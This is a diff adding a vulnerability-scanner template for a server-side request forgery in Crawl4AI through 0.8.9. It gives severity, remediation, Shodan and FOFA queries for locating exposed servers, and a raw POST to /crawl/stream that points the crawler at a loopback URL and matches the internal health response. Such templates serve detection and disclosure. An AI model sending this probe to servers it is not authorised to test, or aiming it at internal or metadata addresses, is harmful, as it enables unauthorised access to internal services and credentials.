@@ -1,0 +1,64 @@
+id: crawl4ai-stream-ssrf
+
+info:
+  name: Crawl4AI <= 0.8.9 - Server Side Request Forgery
+  author: aryu-ru
+  severity: high
+  description: |
+    Crawl4AI through 0.8.9 contains a server side request forgery caused by the streaming crawl handler omitting the seed URL destination check, letting unauthenticated attackers reach loopback, private network and cloud metadata addresses and read the response body, exploit requires only network access to the Docker API server.
+  impact: |
+    Unauthenticated attackers can read responses from internal HTTP services and cloud instance metadata endpoints, exposing credentials, tokens and internal application data, and can use the crawler as a pivot into networks the container can reach.
+  remediation: |
+    Update to version 0.9.0 or later, where the streaming and non streaming handlers share the same seed URL validation.
+  reference:
+    - https://github.com/unclecode/crawl4ai/security/advisories/GHSA-wm69-2pc3-rmmf
+    - https://github.com/unclecode/crawl4ai/blob/v0.8.9/deploy/docker/api.py
+    - https://github.com/unclecode/crawl4ai/blob/v0.9.0/deploy/docker/api.py
+    - https://github.com/unclecode/crawl4ai/releases/tag/v0.9.0
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
+    cvss-score: 8.6
+    cwe-id: CWE-918
+  metadata:
+    verified: true
+    max-request: 1
+    vendor: unclecode
+    product: crawl4ai
+    shodan-query: http.title:"Crawl4AI Playground"
+    fofa-query: title="Crawl4AI Playground"
+  tags: crawl4ai,unclecode,ssrf,unauth,vuln
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /crawl/stream HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"urls":["http://127.0.0.1:11235/health"],"crawler_config":{"type":"CrawlerRunConfig","params":{"cache_mode":"BYPASS","page_timeout":15000}}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "application/x-ndjson"
+
+      - type: word
+        part: body
+        words:
+          - '\"status\":\"ok\"'
+          - '\"version\":'
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - '"server_memory_mb"'
+          - '"success": true'
+        condition: and
+
+      - type: status
+        status:
+          - 200
